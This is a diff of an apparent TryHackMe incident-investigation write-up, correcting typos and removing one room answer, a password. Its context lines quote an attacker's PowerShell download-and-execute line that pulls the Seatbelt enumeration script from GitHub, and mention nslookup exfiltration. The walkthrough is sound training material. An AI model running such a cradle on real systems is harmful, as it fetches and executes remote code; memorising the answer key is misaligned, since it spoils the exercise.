@@ -199,7 +199,7 @@ We observe obvious signs of C2
 
 ### 2. What is the name of the enumeration tool downloaded by the attacker?
 
-In our previous question we saw a a tool being downlaoded form git.
+In our previous question, we saw a tool being downloaded from Git.
 ```
 ubuntu@tryhackme:~/Desktop/artefacts$ jq . powershell.json | grep -i "http"
   "ScriptBlockText": "iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd",
@@ -374,7 +374,7 @@ The **nslookup** protocol can be used to exfiltrate data, as attackers will hide
 
 ### 4. What is the password of the exfiltrated file?
 
-**Answer: %p9^3!lL^Mz47E2GaT^y**
+**Answer: **
 
 ---
 
